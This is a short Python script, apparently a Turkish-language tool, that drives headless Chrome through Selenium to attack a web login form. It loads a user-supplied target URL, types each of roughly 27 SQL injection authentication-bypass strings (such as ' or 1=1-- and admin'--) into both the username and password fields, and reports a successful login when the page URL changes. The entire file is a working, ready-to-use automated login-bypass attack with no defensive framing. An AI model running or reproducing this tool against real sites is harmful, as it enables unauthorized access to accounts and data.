from selenium import webdriver
import time

kod = ["'=' 'or'", "''Or'='Or''", "anything' OR 'x'='x", "1'or'1'='1", "' or 1=1 or ''='", '" or 1=1 or ""="', "' OR ''='", "'' OR ''=''", "'OR''='", "hey' or 1=1–", "''Or 1 = 1'", "' or 1=1--", "or 1=1--", '" or 1=1--', "or 1=1--", "' or 'a'='a", '" or "a"="a', "') or ('a'='a", 'hi") or ("a"="a', "'hi' or 'x'='x';", "x' or 1=1 or 'x'='y", "'or select *", "admin'--", '")) or (("x"))=(("x', '" or ""+"', 'admin"or 1=1 or ""="', 'admin") or ("1"="1"--']

print("""
 1\033[91m}>\033[0mId
 2\033[91m}>\033[0mName
 3\033[91m}>\033[0mXpath
""")

sec = int(input("\033[91m[\033[0m*\033[91m]\033[0mSeciminiz: "))

options = webdriver.ChromeOptions() 
options.add_argument('--headless') 

hedef = input("\033[91m[\033[0m*\033[91m]\033[0mHedef: ")
uname = input("\033[91m[\033[0m*\033[91m]\033[0mKullanici bilgisi: ")
pname = input("\033[91m[\033[0m*\033[91m]\033[0mSifre bilgisi: ")
buton = input("\033[91m[\033[0m*\033[91m]\033[0mButon bilgisi: ")
browser = webdriver.Chrome(options=options)

for i in kod:
 try:
   browser.get(hedef)
   time.sleep(2)  
   if sec == 1:
        username = browser.find_element_by_id(uname)
        password = browser.find_element_by_id(pname)
        login = browser.find_element_by_id(buton)
   elif sec == 2:
        username = browser.find_element_by_name(uname)
        password = browser.find_element_by_name(pname)
        login = browser.find_element_by_name(buton)
   elif sec == 3:
        username = browser.find_element_by_xpath(uname)
        password = browser.find_element_by_xpath(pname)
        login = browser.find_element_by_xpath(buton)
   else:
        exit()
   username.send_keys(i)
   password.send_keys(i)
   time.sleep(0.5) 
   login.click()
   time.sleep(1)
   url = browser.current_url
   if hedef != url:
        print("\033[91m[\033[0m+\033[91m]\033[0mGiris basarili: "+i)
   else:
        print("\033[91m[\033[0m+\033[91m]Giris yapilamadi: "+i)
 except:
      print("\033[91m[\033[0m+\033[91m]Giris yapilamadi: "+i)
browser.close()
       
